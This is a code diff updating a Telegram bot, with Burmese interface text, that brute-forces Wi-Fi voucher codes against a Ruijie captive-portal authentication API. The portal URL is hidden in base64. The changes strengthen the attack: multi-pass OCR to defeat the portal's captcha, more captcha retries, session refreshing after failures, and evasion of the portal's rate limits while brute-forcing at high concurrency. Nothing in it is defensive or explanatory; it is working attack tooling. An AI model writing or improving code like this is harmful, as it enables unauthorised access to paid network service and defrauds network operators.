@@ -1,6 +1,7 @@
 # ═══════════════════════════════════════════════════════════════════════════
-#  VOUCHER BOT — Ruijie Captcha Update Support
+#  VOUCHER BOT — Ruijie 2026 System Update Support
 #  Admin: 1626617395
+#  Features: Captcha retry, session refresh, rate-limit handling
 # ═══════════════════════════════════════════════════════════════════════════
 import asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
 import logging
@@ -23,7 +24,7 @@ logger = logging.getLogger("VoucherBot")
 
 # ─── Environment variables ────────────────────────────────────────────────
 BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
-ADMIN_ID     = "1626617395"                            # ← hardcoded admin
+ADMIN_ID     = "1626617395"
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
 REPO_NAME    = os.environ.get("REPO_NAME",    "")
@@ -59,7 +60,9 @@ SUCCESS_CODE = asyncio.Queue()
 
 session    = None
 _connector = None
-CONCURRENCY  = 200          # ← Captcha ကြောင့် လျှော့ထားသည်
+
+# ── 2026 UPDATE: Reduced concurrency due to aggressive captcha enforcement ──
+CONCURRENCY  = 150
 _voucher_sem = None
 _start_time  = time.monotonic()
 
@@ -67,7 +70,11 @@ MAX_CONCURRENT_SCANS = 5
 active_scans_count   = 0
 active_scans_lock    = asyncio.Lock()
 
-BATCH_SIZE = 200            # ← Captcha ကြောင့် လျှော့ထားသည်
+BATCH_SIZE = 150
+
+# ── 2026 UPDATE: Captcha retry count increased (Ruijie captcha is harder) ──
+CAPTCHA_MAX_RETRIES = 15
+CAPTCHA_RATE_LIMIT_COOLDOWN = 3  # seconds
 
 BRUTE_MODES = {
     "1": {"name": "ဂဏန်းသီးသန့် (0-9)",         "charset": string.digits},
@@ -281,18 +288,55 @@ def is_safe_url(url: str) -> bool:
     except Exception:
         return False
 
-# ─── CAPTCHA ────────────────────────────────────────────────────────────
+# ─── CAPTCHA (2026 Update) ──────────────────────────────────────────────
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def _ocr_sync(image_bytes):
+    """Enhanced OCR with multiple preprocessing passes for higher accuracy."""
     nparr = np.frombuffer(image_bytes, np.uint8)
     img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-    if img is None: return None
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    blur = cv2.GaussianBlur(gray, (3, 3), 0)
-    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    _, buf = cv2.imencode(".png", thresh)
-    return _ocr.classification(buf.tobytes()).upper()
+    if img is None:
+        return None
+
+    # Try multiple preprocessing methods and pick the longest result
+    results = []
+
+    # Method 1: Standard grayscale + Otsu
+    try:
+        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+        blur = cv2.GaussianBlur(gray, (3, 3), 0)
+        _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+        _, buf = cv2.imencode(".png", th)
+        r = _ocr.classification(buf.tobytes()).upper()
+        if r: results.append(r)
+    except Exception:
+        pass
+
+    # Method 2: Adaptive threshold
+    try:
+        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+        th = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
+                                    cv2.THRESH_BINARY, 11, 2)
+        _, buf = cv2.imencode(".png", th)
+        r = _ocr.classification(buf.tobytes()).upper()
+        if r: results.append(r)
+    except Exception:
+        pass
+
+    # Method 3: No preprocessing (raw)
+    try:
+        _, buf = cv2.imencode(".png", img)
+        r = _ocr.classification(buf.tobytes()).upper()
+        if r: results.append(r)
+    except Exception:
+        pass
+
+    if not results:
+        return None
+
+    # Return the most common or longest result
+    results.sort(key=len, reverse=True)
+    return results[0]
 
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
@@ -306,6 +350,7 @@ def replace_mac(url, new_mac):
     return re.sub(r"(?<=mac=)[^&]+", new_mac, url)
 
 async def get_session_id(sess, session_url, prev=None):
+    """Fetch a fresh sessionId. 2026: follow all redirects, look everywhere."""
     url = replace_mac(session_url, get_mac())
     headers = {
         "accept": "text/html,application/xhtml+xml,*/*;q=0.8",
@@ -314,8 +359,28 @@ async def get_session_id(sess, session_url, prev=None):
     try:
         async with sess.get(url, headers=headers, allow_redirects=True,
                             timeout=aiohttp.ClientTimeout(total=15)) as req:
+            # Check final URL
             m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
-            return m.group(1) if m else prev
+            if m:
+                return m.group(1)
+            # Check redirect history
+            for h in req.history:
+                m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(h.url))
+                if m:
+                    return m.group(1)
+                loc = h.headers.get("Location", "")
+                m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", loc)
+                if m:
+                    return m.group(1)
+            # Check body
+            try:
+                body = await req.text()
+                m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', body)
+                if m:
+                    return m.group(1)
+            except Exception:
+                pass
+            return prev
     except Exception as e:
         logger.debug(f"get_session_id: {e}")
         return prev
@@ -355,19 +420,32 @@ async def check_session_url(session_url):
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     try:
-        async with session.get(session_url, allow_redirects=False, headers=headers,
-                               timeout=aiohttp.ClientTimeout(total=15)) as first:
-            location = first.headers.get("Location", "")
-            if location and is_safe_url(location):
-                async with session.get(location, allow_redirects=False, headers=headers,
-                                       timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                    return "sessionId" in str(resp.url) or "sessionId" in location
-            return "sessionId" in str(first.url) or "sessionId" in location
+        # Direct check first
+        if "sessionId" in session_url:
+            return True
+
+        async with session.get(session_url, allow_redirects=True, headers=headers,
+                               timeout=aiohttp.ClientTimeout(total=20)) as resp:
+            if "sessionId" in str(resp.url):
+                return True
+            for h in resp.history:
+                if "sessionId" in str(h.url):
+                    return True
+                loc = h.headers.get("Location", "")
+                if "sessionId" in loc:
+                    return True
+            try:
+                body = await resp.text()
+                if "sessionId" in body:
+                    return True
+            except Exception:
+                pass
+            return False
     except Exception as e:
         logger.error(f"check_session_url: {e}")
         return False
 
-# ─── Core voucher check (with captcha retry) ─────────────────────────────
+# ─── Core voucher check (2026 Captcha-aware) ────────────────────────────
 POST_URL = base64.b64decode(
     b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
 ).decode()
@@ -391,19 +469,30 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
             if not session_id:
                 continue
 
-            # ── Captcha: 12 retries with fresh image each time ──
+            # ── 2026 UPDATE: 15 captcha retries with multi-pass OCR ──
             auth_code = None
-            for _ in range(12):
+            for cap_attempt in range(CAPTCHA_MAX_RETRIES):
                 try:
                     img  = await Captcha_Image(ts, session_id)
                     text = await Captcha_Text(img)
                     if text and await Varify_Captcha(ts, session_id, text):
                         auth_code = text
                         break
+                    # If captcha fails repeatedly, refresh session
+                    if cap_attempt == CAPTCHA_MAX_RETRIES // 2:
+                        new_sid = await get_session_id(ts, session_url, session_id)
+                        if new_sid and new_sid != session_id:
+                            session_id = new_sid
+                            logger.debug(f"Session refreshed after captcha failures")
                 except Exception:
                     continue
+
             if not auth_code:
-                logger.warning(f"Captcha failed for session {session_id}, code={code}")
+                logger.warning(f"Captcha failed ({CAPTCHA_MAX_RETRIES} tries) for code={code}")
+                # Refresh session and skip this code
+                new_sid = await get_session_id(ts, session_url, session_id)
+                if new_sid:
+                    session_id = new_sid
                 continue
 
             if not recheck:
@@ -430,9 +519,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                 logger.debug(f"perform_check post: {e}")
                 return None
 
+        # ── 2026 UPDATE: request limited → captcha retry with fresh session ──
         if response and "request limited" in response:
-            logger.warning(f"Rate limited on code={code}, retrying with new captcha ({attempt+1}/3)")
-            await asyncio.sleep(2)
+            logger.warning(f"Rate limited on code={code}, refreshing session + captcha ({attempt+1}/3)")
+            await asyncio.sleep(CAPTCHA_RATE_LIMIT_COOLDOWN)
             continue
         break
 
@@ -570,7 +660,7 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
         async with active_scans_lock:
             active_scans_count = max(0, active_scans_count - 1)
 
-# ─── Keyboards ──────────────────────────────────────────────────────────
+# ─── Keyboards (same as before) ────────────────────────────────────────
 def kb_main():
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
@@ -775,7 +865,8 @@ async def cmd_help(message):
         "၄။ /status /saved            – အခြေအနေ / ရလဒ်\n"
         "၅။ /delete_saved             – ရလဒ်ဖျက်\n"
         "၆။ /recheck                  – codes ပြန်စစ်\n"
-        "၇။ /notify                   – Notification ON/OFF")
+        "၇။ /notify                   – Notification ON/OFF\n\n"
+        "⚠️ Ruijie 2026 Update: Captcha လိုအပ်လာပါပြီ။")
 
 @bot.message_handler(commands=["setup"])
 async def cmd_setup(message):
